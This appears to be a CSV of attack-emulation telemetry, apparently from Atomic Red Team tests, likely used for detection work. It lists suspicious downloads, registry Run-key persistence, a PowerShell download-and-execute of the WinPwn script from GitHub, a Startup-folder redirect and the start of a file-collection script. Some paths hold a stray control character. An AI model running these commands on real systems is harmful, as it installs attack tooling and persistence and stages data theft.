148e2a54-2a82-42ff-b065-08e58f8a200f,{'file': 'C:\\Users\\victim\\Downloads\\VERY_CAMEO.bin'},1
448b73c3-29c5-47cc-abe2-5e1bb2810b14,{'file': 'C:\\Users\\victim\\Downloads\\ABUNDANT_NUMERACY.exe'},2
398b6147-ffed-46c7-aa0c-d8d6496760b6,{'subject': '"C:\\Users\\victim\\Downloads\\ABUNDANT_NUMERACY.exe" '},3
c5efc831-374b-4d6b-9fe2-31b7b24ce71e,{'file': 'C:\\Users\\victim\\Downloads\\AGREEABLE_NIECE.exe'},4
b0db3d66-fdea-43e3-aa8e-f18397e6cf1f,{'subject': 'cmd.exe /c "REG ADD \\"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" /V \\"Atomic Red Team\\" /t REG_SZ /F /D \\"C:\\Users\\victim\\Downloads\\AGREEABLE_NIECE.exe\\""'},5
7d0480c0-c2ed-4106-99a3-ae5d7486a418,{'subject': 'REG  ADD \\"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" /V \\"Atomic Red Team\\" /t REG_SZ /F /D \\"C:\\Users\\victim\\Downloads\\AGREEABLE_NIECE.exe\\"'},6
ec095ce1-0dd9-4b42-9ada-777c1a76b9d5,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},7
afb88a65-5832-4aa8-987d-3518d70b328f,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},8
e5ddf03b-a34f-44c0-a123-e107d721b192,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},9
2095b389-5a52-40a9-9c1b-8bfc87f7575f,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},10
473129e1-4b63-479b-9ed3-b524f49bbd82,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},11
658b9c09-54f1-4896-b9a5-628aca017d8a,{'subject': 'powershell.exe -Command "Copy-Item -path \\"C:\\Windows\\System32\\calc.exe\\" -destination \\"$env:TMP\x07tomictest\\""'},12
dfe6e367-f8e3-432d-bb91-4909260ad2ea,{'subject': 'powershell.exe -Command "New-Item -ItemType Directory -path \\"$env:TMP\x07tomictest\\""'},13
658b9c09-54f1-4896-b9a5-628aca017d8a,{'subject': 'powershell.exe -Command "Copy-Item -path \\"C:\\Windows\\System32\\calc.exe\\" -destination \\"$env:TMP\x07tomictest\\""'},14
f8dfcb8d-b1da-46f9-8307-82240c251783,{'subject': 'powershell.exe -Command "Set-ItemProperty -Path  \\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\" -Name \\"Startup\\" -Value \\"$env:TMP\x07tomictest\\""'},15
1cb6ff9c-2b4c-497f-98cd-42c323376386,{'subject': 'powershell.exe -Command "$startingDirectory=\\"C:\\"; $outputZip=\\"#{output_zip_folder_path}\\"; $fileExtensions=@(\\".doc\\"'},16
